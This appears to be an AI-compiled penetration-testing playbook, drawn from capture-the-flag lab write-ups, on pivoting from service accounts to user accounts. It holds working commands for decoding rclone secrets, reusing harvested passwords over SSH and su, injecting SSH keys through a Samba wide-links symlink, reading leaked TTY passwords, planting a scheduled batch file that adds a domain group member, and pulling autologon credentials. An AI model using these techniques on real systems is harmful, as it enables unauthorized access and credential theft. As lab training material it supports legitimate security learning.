

# Combined Pentest Holy Grail — Phase 3: Privilege Escalation (Service to User)

This phase covers pivots from:
- web/service account
- low-priv service shell
- restricted foothold

to:
- standard user account
- better remote-access user
- authenticated desktop / WinRM / SSH identity

Structured by the **linchpin flaw/mechanic** used to pivot.

---

# 1. Exposed Backup Config / `rclone` Secret Reuse  
## Pivot
- `nobody` → `scott`

## Root Cause
- readable backup config
- obfuscated, not encrypted password
- credential reuse

## Target Pattern
Look for:
- backup scripts
- sync configs
- `rclone.conf`
- SFTP/RSYNC/API creds in config files

## Enumeration Commands
```bash
cat /etc/passwd | grep nobody
ls /home
cat /etc/passwd | grep 'sh$'
ls /opt
ls /opt/offsite-backup
cat /opt/offsite-backup/sync.sh
cat /opt/offsite-backup/rclone.conf
```

## Key Findings
```bash
nobody@abducted:/opt/offsite-backup$ ls
rclone.conf sync.sh
```

Script:
```bash
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

Config:
```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

## Decode Password
```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

Recovered:
```text
iXzvcib3SrpZ
```

## Exploitation
```bash
su - marcus
su - scott
```

Result:
- `marcus` failed
- `scott` succeeded

Stable shell:
```bash
sshpass -p iXzvcib3SrpZ ssh scott@10.129.244.177
```

## Success Indicator
```text
scott@abducted:~$
```

## Operator Notes
- `rclone` “passwords” are commonly just reversible obfuscation
- always test recovered secrets against local users, SSH, SMB, DBs

---

# 2. Samba Wide Links + Forced User → SSH Key Injection  
## Pivot
- `scott` → `marcus`

## Root Cause
- Samba share writable by one user
- `force user = marcus`
- `wide links = yes`
- `allow insecure wide links = yes`

## Target Pattern
When on a Samba host, look for:
- `/etc/samba/shares.conf`
- `/etc/samba/smb.conf`
- writable share backing paths
- `force user`
- `wide links`
- `allow insecure wide links`

## Enumeration Commands
```bash
sudo -l
ls -l /srv
cat /srv/projects/README.txt
cat /etc/samba/shares.conf
cat /etc/samba/smb.conf
```

## Key Findings

Share config:
```ini
[transfer]
comment = Staff file transfer
path = /srv/transfer
valid users = scott
force user = marcus
read only = no
wide links = yes
browseable = yes
```

Global config:
```ini
unix extensions = no
allow insecure wide links = yes
```

## Exploitation Logic
- `scott` can authenticate to `transfer`
- writes happen as `marcus`
- symlink can point outside share path
- remote SMB access follows the link as effective `marcus`

## Exploitation Steps

### Create symlink
```bash
cd /srv/transfer
ln -s /home/marcus
ls -l
```

Expected:
```text
marcus -> /home/marcus
```

### Access through SMB
```bash
smbclient //10.129.244.177/transfer -U scott%iXzvcib3SrpZ
```

Inside:
```bash
ls
cd marcus
ls
```

### Drop SSH key
```bash
mkdir .ssh
put /home/oxdf/keys/ed25519_gen.pub .ssh/authorized_keys
cd .ssh
ls
```

### Login
```bash
ssh -i ~/keys/ed25519_gen marcus@10.129.244.177
```

## Success Indicator
```text
marcus@abducted:~$
```

## Operator Notes
- powerful when `force user` maps writes to a different local user
- easiest persistence/pivot is usually `authorized_keys`

---

# 3. Database Credential Reuse from App Config  
## Pivot
- `www-data` → normal user
- multiple boxes used this pattern

## Root Cause
- app config readable by service account
- DB creds reveal either:
  - local user password reuse
  - user passwords stored in DB
  - secrets for next pivot

---

## 3A. Dump app DB and reuse user password  
### Pivot
- `www-data` → `corum`

### Enumeration
```bash
cat /app/config_prod.json
```

Finding:
```json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

### DB access
```bash
mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' superpass
select * from passwords;
```

Relevant rows:
```text
| agile | corum | 5db7caa1d13cc37c9fc2 |
```

### Exploitation
```bash
sshpass -p '5db7caa1d13cc37c9fc2' ssh corum@superpass.htb
```

### Success Indicator
```text
corum@agile:~$
```

---

## 3B. Read `.env` and reuse DB password as local user password  
### Pivot
- `www-data` → `cry0l1t3`

### Enumeration
```bash
cat /var/www/html/academy/.env
```

Key lines:
```text
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

### Exploitation
```bash
su - cry0l1t3
# password: mySup3rP4s5w0rd!!
```

Or:
```bash
ssh cry0l1t3@10.10.10.215
```

## Success Indicator
```text
cry0l1t3@academy:~$
```

---

## 3C. Read commented-out creds in app data/config  
### Pivot
- `opentsdb` → `jennifer`

### Enumeration
```bash
cat /var/www/adminer/plugins/data/servers.php
```

Finding:
```php
// 'username' => 'admirer',
// 'pass' => 'bQ3u7^AxzcB7qAsxE3',
'username' => 'admirer_ro',
'pass' => '1w4nn4b3adm1r3d2!',
```

### Exploitation
```bash
su - jennifer
# password: bQ3u7^AxzcB7qAsxE3
```

Or:
```bash
sshpass -p 'bQ3u7^AxzcB7qAsxE3' ssh jennifer@10.10.11.137
```

## Success Indicator
```text
jennifer@admirertoo:~$
```

## Operator Notes
- comments are secrets too
- “old” creds often remain valid
- after landing in a web app or service account shell, enumerate all configs before running noisy tools

---

# 4. Audit Log / TTY Leakage  
## Pivot
- `cry0l1t3` → `mrb3n`

## Root Cause
- user in `adm` group
- readable audit logs
- plaintext password leaked in `aureport --tty`

## Target Pattern
Look for:
- user in `adm`
- `/var/log/audit/`
- `aureport`
- TTY/audit reconstruction

## Enumeration Commands
```bash
id
aureport --tty
cat /var/log/audit/audit.log*
```

## Key Findings
```bash
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

TTY report leaked:
```text
2. ... su "mrb3n_Ac@d3my!",<nl>
```

## Exploitation
```bash
su mrb3n -
# password: mrb3n_Ac@d3my!
```

Or:
```bash
ssh mrb3n@10.10.10.215
```

## Success Indicator
```text
uid=1001(mrb3n) gid=1001(mrb3n)
```

## Operator Notes
- `aureport --tty` is extremely high-value if readable
- if `aureport` unavailable, grep raw `audit.log` for `data=` and decode hex manually

---

# 5. Restricted Shell / Remote PowerShell Reuse & Group-Based Pivot  
## Pivot
- `imonks` → `jmorgan`
- then to more privileged operators on the same remote management workflow

## Root Cause
- recovered/shared creds reused in constrained PowerShell remoting
- delegation / group membership / intended workflow weaknesses

## Enumeration Commands
```powershell
Invoke-Command -ScriptBlock { cat C:\users\imonks\desktop\user.txt } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Invoke-Command -ScriptBlock { Get-Command } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Invoke-Command -ScriptBlock { Get-Alias } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Invoke-Command -ScriptBlock { ls '\program files' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

## Key Findings
- very limited remoting command set:
  - `Get-ChildItem`
  - `Get-Content`
  - `Set-Content`
  - etc.
- unusual directory:
  - `C:\program files\keepmeon`
- some users could access paths others couldn’t

## Resulting Pivot
- credentials / permissions allowed moving into:
  - `jmorgan`
  - later `awallace`
  - then `Site_Admin` path

## Operator Notes
- constrained remoting is still enough if `Set-Content` is available
- group-based scheduled-task/script execution is a common pivot pattern on Windows

---

# 6. Writable Scheduled `.bat` Execution Path  
## Pivot
- low-priv delegated access → **Site Admin**-level control

## Root Cause
- writable directory scanned by scheduled privileged batch script

## Enumeration Commands
```powershell
Invoke-Command -ScriptBlock { ls '\program files\keepmeon' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Invoke-Command -ScriptBlock { cat '\program files\keepmeon\keepmeon.bat' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Invoke-Command -ScriptBlock { net group /domain } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Invoke-Command -ScriptBlock { net group Site_Admin /domain } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

## Key File
```bat
REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)
```

## Exploitation
Write attacker-controlled batch file:
```powershell
Invoke-Command -ScriptBlock { Set-Content -Path '\program files\keepmeon\0xdf.bat' -Value 'net group site_admin awallace /add /domain'} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

Check later:
```powershell
Invoke-Command -ScriptBlock { net group Site_Admin /domain } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

## Success Indicator
```text
Members
-------------------------------------------------------------------------------
awallace
```

## Operator Notes
- if you can’t get code execution directly, writing a one-line membership manipulation script is often enough
- scheduled execution every 5 minutes is ideal for reliable pivots

---

# 7. Remote Debug / Browser Session Theft → Credential Pivot  
## Pivot
- `corum` → `edwards`

## Root Cause
- Selenium / headless Chrome running with fixed remote debugging port
- browser session/cookies recoverable
- credentials stored in test vault

## Enumeration Commands
```bash
ls -l /app
cat /app/app-testing/tests/functional/test_site_interactively.py
```

Key finding in test code:
```python
options.add_argument("--remote-debugging-port=41829")
```

Also:
```python
with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
    username, password = f.read().strip().split(':')
```

## Exploitation Logic
- connect to remote Chrome debug session
- inspect cookies / application storage
- access test vault
- recover another `agile` password, this time for `edwards`

## Success Outcome
- pivot to `edwards`
- then continue toward root through sudoedit abuse

## Operator Notes
- fixed Chrome debug ports are gold
- headless browser test environments often store privileged test creds/session state

---

# 8. AutoLogon Registry Credentials  
## Pivot
- `svc_web` / `jdoe` path → `jdoe`
- then onward via WinRM

## Root Cause
- Windows autologon credentials stored in registry

## Target Pattern
Check:
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

## Enumeration Commands
```powershell
cd HKLM:
cd "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-ItemProperty . | Select-Object DefaultDomainName, DefaultUserName, DefaultPassword
```

## Findings
```text
DefaultDomainName  analysis.htb.
DefaultUserName    jdoe
DefaultPassword    7y4Z4^*y9Zzj
```

## Exploitation
Use creds for next access method:
- WinRM
- other lateral move / local logon

## Operator Notes
- WinPEAS finds this too, but native PowerShell is quieter
- one of the highest-yield Windows enumeration checks

---

# 9. Web Logs / Operational Artifacts with Credentials  
## Pivot
- service foothold → standard user / operator creds

## Root Cause
- credentials left in application logs or operational files

## Enumeration Commands
```powershell
ls C:\inetpub\internal\dashboard
type <log_or_php_file>
```

## Target Pattern
Look for:
- debug logs
- login traces
- deployment notes
- handler scripts
- copied binaries like `mshta.exe`
- unusual READ-ME / LICENSE / custom YARA / admin files

## Operator Notes
- app directories often have more than just web code
- incident-response dashboards, internal panels, and “temporary” debug tooling frequently leak creds

---

# 10. SMB Share Access + User-Opened Malicious File  
## Pivot
- valid share creds → execution as interactive user

## Root Cause
- writable/readable shared content consumed by target user
- vulnerable file format / app processing (e.g. Jamovi `.omv`)

## Enumeration Commands
```bash
smbclient --user=windcorp.htb/localadmin -L //10.10.11.102
smbclient //10.10.11.102/Shared -U windcorp.htb/localadmin
ls
cd Documents
cd Analytics
ls
```

## Key Findings
- share `Shared`
- software installers:
  - `jamovi-1.6.16.0-win64.exe`
- recently accessed file:
  - `Whatif.omv` with fresh timestamp

## Exploitation Logic
- identify vulnerable desktop app (`Jamovi`)
- weaponize consumed project/document format
- wait for scheduled user interaction

## Success Outcome
- shell as `diegocruz`

## Operator Notes
- recent timestamps are strong signal for active-use artefacts
- in enterprise shares, attacker-controlled document/project formats are powerful service-to-user pivots

---

# 11. Wireless / Config Script Cred Leak → Cross-System Pivot  
## Pivot
- `root@AirTouch-AP-PSK` → `remote@AirTouch-AP-MGT`

## Root Cause
- admin script storing cleartext SSH/SCP password
- trust relationship between systems

## Enumeration Commands
```bash
ls -la /root
cat /root/send_certs.sh
ip addr
```

## Key Finding
```bash
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
```

## Exploitation
From a reachable path:
```bash
proxychains sshpass -p xGgWEwqUpfoOVsLeROeG ssh remote@10.10.10.1
```

## Success Indicator
```text
remote@AirTouch-AP-MGT:~$
```

## Operator Notes
- look for sync scripts, backup scripts, cert copy scripts, deployment scripts
- machine-to-machine trust scripts often contain the next hop creds

---

# 12. Credential Leakage in EAP / `hostapd` User File  
## Pivot
- `remote` → `admin`

## Root Cause
- credential exposure in wireless auth configuration / recovered EAP material

## Target Pattern
Look for:
- `/etc/hostapd`
- `eap_user`
- PEAP/MSCHAPv2 material
- lab/test creds embedded in config

## Key Finding
```text
"admin" MSCHAPV2 "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

## Exploitation
```bash
su - admin
# password: xMJpzXt4D9ouMuL3JJsMriF7KZozm7
```

Or:
```bash
proxychains sshpass -p xMJpzXt4D9ouMuL3JJsMriF7KZozm7 ssh admin@10.10.10.1
```

## Success Indicator
```text
admin@AirTouch-AP-MGT:~$
```

## Operator Notes
- lab/infra wireless configs often hardcode service/admin passwords
- if you’ve already got a root shell on one network node, read everything under wireless auth config paths

---

# 13. Quick Credential Reuse / `su` / SSH / WinRM Testing

A recurring service-to-user pattern across many boxes was:

## Workflow
1. read config / dump DB / inspect comments / grab logs
2. recover cleartext secret
3. test against:
   - `su`
   - `ssh`
   - `smb`
   - `winrm`
   - internal app login

## Common commands
```bash
su - <user>
sshpass -p '<pass>' ssh <user>@<host>
netexec smb <IP> -u <user> -p '<pass>'
netexec winrm <IP> -u <user> -p '<pass>'
```

## Best examples from write-ups
- `rclone` secret → `scott`
- DB password → `cry0l1t3`
- DB comment password → `jennifer`
- vault DB dump → `corum`
- browser/debug session → `edwards`
- autologon → `jdoe`
- script credential → `remote`
- EAP config → `admin`

---

# 14. Phase 3 Operator Checklist

## Linux service foothold checklist
Run these early:
```bash
id
ls /home
cat /etc/passwd | grep 'sh$'
find /opt -maxdepth 3 -type f 2>/dev/null
find /srv -maxdepth 3 -type f 2>/dev/null
find /etc -type f 2>/dev/null | grep -E 'conf|config|env|bak'
grep -R "password\|pass\|secret\|token" /opt /srv /var/www 2>/dev/null
```

## Windows service foothold checklist
```powershell
whoami
whoami /groups
net user
dir C:\users
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
dir C:\inetpub /s /b
dir C:\ /s /b | findstr /i "config log txt ini bat ps1 xml"
```

## App-specific high-yield targets
- `.env`
- `config*.json`
- `servers.php`
- test scripts
- Selenium / Chrome debug flags
- backup scripts
- `rclone.conf`
- SSH keys / `authorized_keys`
- commented-out creds
- audit logs
- scheduled scripts

---

# 15. Success Indicators Summary

| Pivot Type | Success Indicator |
|---|---|
| `rclone` / backup creds | `su` / SSH as next user |
| Samba wide links | access to target home via SMB |
| DB config password reuse | `su` / SSH as user |
| audit log leak | plaintext password in `aureport --tty` |
| browser debug theft | new user password / session access |
| autologon | registry shows username + password |
| writable scheduled `.bat` | membership change after delay |
| trust script creds | SSH to adjacent host |
| wireless config creds | `su - admin` / SSH success |

---

# 16. Pitfalls

## Timing / ephemeral issues
- browser/test shells may die fast
- scheduled tasks require patience
- some membership changes revert periodically

## False assumptions
- not every DB credential is a local user password
- not every commented credential is stale
- not every app-testing file is readable directly; sometimes you need session theft/debugging

## SMB-specific
- local permissions may deny a path directly, but SMB + forced user/wide links may still work
- recent timestamps on files in shares often matter more than file names

## Windows-specific
- constrained remoting is still enough if `Set-Content` or `Get-Content` exists
- registry secrets are often easier than memory scraping
- internal app directories can hold logs, creds, and tooling

---

If you want, I can continue with:

# **Combined Pentest Holy Grail — Phase 4: Privilege Escalation (User to Root / Administrator)**

in the same merged style.
